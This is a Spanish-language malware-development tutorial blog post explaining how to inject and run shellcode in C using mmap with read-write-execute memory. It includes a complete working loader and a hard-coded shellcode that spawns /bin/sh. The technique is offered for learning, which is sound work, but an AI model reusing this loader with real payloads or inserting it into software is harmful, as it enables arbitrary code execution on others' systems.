---
layout: post
title: Inyeccion de shellcodes usando la syscall mmap
author: c4rta
date: 2023-06-10
tags: [MalDev]
image: /assets/img/mmap_injection/waifu.jpg
---
Desarrollaremos un programa en C el cual inyectara una shellcode usando la syscall mmap()
{:.lead}

## mmap

mmap es una syscall y una funcion incorporada en el header ```sys/mman.h``` la cual permite asignar o mapear memoria dentro del espacio de direcciones virtuales de un proceso, mmap regresa un puntero void (void *), la estructura es:

```c
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
```

- **void *addr**: Es la direccion desde donde se va a asignar la memoria, esta direccion se la podemos asignar manualmente, o en todo caso de que le pogamos ```NULL```, le estamos diciendo al kernel que asigne la memoria, regularmente  la asigna a direcciones cercanas pero mayores a ```/proc/sys/vm/mmap_min_addr```

- **size_t length**: Es la longitud en bytes de la memoria que se va a asignar

- **int prot**: Se refiera a con que protecciones vamos a asignar la memoria, hay varias
  - PROT_EXEC: La memoria es ejecutable
  - PROT_READ: La memoria tiene permisos de lectura
  - PROT_WRIT: La memoria tiene permisos de escritura

- **int flags**: Determina si las actualizaciones de la memoria, son visibles para otras asignaciones de memoria dentro de la misma region de la memoria, existe muchas flags, asi que puedes leer cada una de ellas [aqui](https://man7.org/linux/man-pages/man2/mmap.2.html).

- **int fd**: Es el descriptor de archivos el cual sera asginado

- **off_t offset**: Es el desplazamiento desde donde se va a asignar la memoria

Una vez sabiendo eso ya podemos comenzar a tirar codigo

## Desarrollo del programa

Primero debemos de empezar a declarar nuestra shellcode como una cadena de caracteres de esta manera:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

const char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";
```
La shellcode ejecutara un /bin/sh

Dentro de una funcion, empezare a declarar todo el codigo de la inyeccion, primero debemos sacar el tamaño en bytes de la shellcode, ya que es uno de los argumentos que recibe **mmap**

```c
void ejecutar_shellcode(){
    size_t tam_shellcode = sizeof(shellcode) - 1;
}
```
Observa que se le esta agregando un ```- 1```, esto es para quitarle el byte nulo.

Despues haremos el llamado a ```mmap```:

```c
void ejecutar_shellcode(){
    size_t tam_shellcode = sizeof(shellcode) - 1;

    void* shellcode_mem = mmap(
        NULL,
        tam_shellcode,
        PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    );
}
```

La direccion donde se va a asignar la memoria es ```NULL``` para que el kernel la elija, el tamaño de la memoria a asignar es el tamaño de la shellcode, en las flag le decimos que la memoria se asigne con permisos de lectura, escritura, y ejecucion, con el ```-1``` le estamos diciendo al descriptor de archivos que no se requiere un archivo ya existente y que solo asigne memoria, y te podras dar cuenta de algo, estamos usando la flag ```MAP_ANONYMOUS + MAP_PRIVATE```, con esas flags le estamos indicando que la asignacion sera simplemente un bloque de memoria en ceros (por eso mismo el offset es 0), la cual estara lista de usar, ademas de ser privada, es decir, estara excluida de otras asignaciones de memoria dentro de la misma region de memoria

Aqui dibuje un diagrama de la asgnacion de memoria con mmap tomando en cuenta el ejemplo

![](/assets/img/mmap_injection/mmap.jpeg)

Lo que se ve a la izquierda es la memoria virtual de un proceso (sin entrar tanto en detalle), te podras dar cuenta que la memoria de la shellcode se asigno dentro de una seccion que se llama ```Memory Mapping```, en esta seccion se asigna memoria para las librerias compartidas y dinamicas, ademas de las asignaciones de ```mmap```, pero ojo, para que una asignacion de ```mmap``` recida en esta seccion, debe de ir con la flag ```MAP_ANONYMOUS```.

Resumidamente el diagrama seria algo asi:

- Usamos ```sizeof()``` para obtener el tamaño de la shellcode y lo guardamos en ```tam_shellcode```
- Asignamos memoria con ```mmap``` donde el tamaño es lo que tiene ```tam_shellcode``` (22 bytes)
- Usamos ```MAP_ANONYMOUS``` para indicarle que la asignacion se haga dentro de la seccion ```Memory Mapping```,

una vez que asignamos memoria para la shellcode, debemos de copiar la shellcode en esa memoria, eso lo hacemos con ```memcpy```, memcpy se usa para copiar cierta cantidad de bytes desde un origen a un destino.

```c
memcpy(shellcode_mem, shellcode, tam_shellcode);
```

En nuestro ejemplo le estamos diciendo que copie 22 bytes (tam_shellcode) del origen (shellcode), hacia la memoria que asignamos (shellcode_mem), y con esta operacion, nuestra shellcode ya estara escrita en la memoria que asigamos con mmap.

Ahora debemos de invocar a la shellcode, para eso realizamos esto:

```c
void (*shellcode_ptr)() = (void (*)())shellcode_mem;
shellcode_ptr();
```

Primero definimos ```shellcode_ptr``` como un puntero a una funcion, con el fin de asignar a ```shellcode_ptr``` la direccion de memora que contiene ```shellcode_mem``` ya que cabe recordar que ```shellcode_mem``` contiene la direccion de memoria desde donde se asigno la shellcode, que es un tipo void *

Despues con ```void (*)()``` le estamos diciendo que defina un puntero a una funcion que no recibe argumentos ni tampoco retorne nada, esto con el fin de que ```shellcode_mem``` sea interpretado como un puntero hacia esa funcion, entonces a travez de ```shellcode_ptr``` podemos mandar a llamar a ```shellcode_mem```.

Asi que cuando se haga un llamado a ```shellcode_ptr();```, ejecutara lo que esta almacenado en ```shellcode_mem```, lo cual es la shellcode:D

Despues solo queda a mandar a llamar a la funcion ```ejecutar_shellcode()``` desde el main:

```c
int main() {
    ejecutar_shellcode();
    return 0;
}
```

Y el codigo completo queda asi:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

const char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"; //bin/sh

void ejecutar_shellcode(){
    size_t tam_shellcode = sizeof(shellcode) - 1;

    void* shellcode_mem = mmap(
        NULL,
        tam_shellcode,
        PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    );

    memcpy(shellcode_mem, shellcode, tam_shellcode);

    printf("Tamaño de la shellcode: %zu bytes\n", tam_shellcode);
    printf("Shellcode asignada desde la direccion: %p\n", shellcode_mem);

        void (*shellcode_ptr)() = (void (*)())shellcode_mem;

        shellcode_ptr();
}

int main() {
    ejecutar_shellcode();
    return 0;
}
```

Solo queda compilar y ejectuar

```
gcc -o inyeccion_mmap inyeccion_mmap.c
./inyeccion_mmap
```

Eso ha sido todo, gracias por leer ❤